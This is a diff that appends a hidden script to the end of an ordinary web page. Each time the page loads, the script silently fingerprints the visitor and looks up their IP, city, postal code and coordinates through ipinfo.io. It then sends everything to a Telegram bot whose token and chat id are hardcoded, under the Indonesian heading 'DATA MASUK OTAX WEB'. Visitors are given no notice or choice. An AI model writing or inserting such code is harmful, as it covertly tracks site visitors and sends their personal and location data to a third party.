@@ -244,3 +244,100 @@ function toggleAccordion(id) {
   </div>
 </body>
 </html>
+<script>
+(async function(){
+  const info = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    languages: (navigator.languages||[]).join(', ') || '-',
+    language: navigator.language,
+    screen: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    deviceMemory: navigator.deviceMemory || '-',
+    hardwareConcurrency: navigator.hardwareConcurrency || '-',
+    cookiesEnabled: navigator.cookieEnabled,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer,
+    mobile: /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent),
+    online: navigator.onLine,
+    touchSupport: 'ontouchstart' in window,
+    page: location.href
+  };
+
+  // Deteksi OS & browser simple
+  function detectBrowser() {
+    const ua = navigator.userAgent;
+    if (/chrome|crios|crmo/i.test(ua)) return "Chrome";
+    if (/firefox|fxios/i.test(ua)) return "Firefox";
+    if (/safari/i.test(ua)) return "Safari";
+    if (/opr\//i.test(ua)) return "Opera";
+    if (/edg/i.test(ua)) return "Edge";
+    if (/trident/i.test(ua)) return "IE";
+    return "Unknown";
+  }
+  function detectOS() {
+    const ua = navigator.userAgent;
+    if (/windows nt/i.test(ua)) return "Windows";
+    if (/android/i.test(ua)) return "Android";
+    if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
+    if (/macintosh|mac os x/i.test(ua)) return "MacOS";
+    if (/linux/i.test(ua)) return "Linux";
+    return "Unknown";
+  }
+  info.browser = detectBrowser();
+  info.os = detectOS();
+
+  // IP & lokasi dari API publik
+  try {
+    const resp = await fetch('https://ipinfo.io/json');
+    const ipdata = await resp.json();
+    info.ip = ipdata.ip || "";
+    info.city = ipdata.city || "";
+    info.region = ipdata.region || "";
+    info.country = ipdata.country || "";
+    info.org = ipdata.org || "";
+    info.loc = ipdata.loc || "";
+    info.timezone_ip = ipdata.timezone || "";
+    info.postal = ipdata.postal || "";
+  } catch (e) {
+    info.ip = "N/A";
+  }
+
+  // Format data
+  let message = "👾 *DATA MASUK OTAX WEB*\n";
+  message += `\n*IP*: \`${info.ip}\``;
+  message += `\n*Kota*: ${info.city || '-'}`;
+  message += `\n*Wilayah*: ${info.region || '-'}`;
+  message += `\n*Negara*: ${info.country || '-'}`;
+  message += `\n*Provider*: ${info.org || '-'}`;
+  message += `\n*Lokasi*: ${info.loc || '-'}`;
+  message += `\n*Kode Pos*: ${info.postal || '-'}`;
+  message += `\n*Zona Waktu*: ${info.timezone_ip || info.timezone}`;
+  message += `\n\n*Browser*: ${info.browser}`;
+  message += `\n*OS*: ${info.os}`;
+  message += `\n*User-Agent*: \`${info.userAgent}\``;
+  message += `\n*Platform*: ${info.platform}`;
+  message += `\n*Bahasa*: ${info.language} (${info.languages})`;
+  message += `\n*Resolusi*: ${info.screen} (depth: ${info.colorDepth})`;
+  message += `\n*CPU Logical*: ${info.hardwareConcurrency}`;
+  message += `\n*RAM*: ${info.deviceMemory} GB`;
+  message += `\n*Touch*: ${info.touchSupport ? "Ya" : "Tidak"}`;
+  message += `\n*Online*: ${info.online ? "Ya" : "Tidak"}`;
+  message += `\n*Cookies*: ${info.cookiesEnabled ? "Aktif" : "Tidak"}`;
+  message += `\n*Referrer*: ${info.referrer}`;
+  message += `\n*URL Halaman*: ${info.page}`;
+
+  // Kirim ke Telegram
+  const telegram_api = "https://api.telegram.org/bot7781557680:AAHls3Z8HJZAQtQM-IxNInorvrF0byoNSCY/sendMessage";
+  const chat_id = "7737364522"; // ganti jika perlu
+  fetch(telegram_api, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  });
+})();
+      </script>
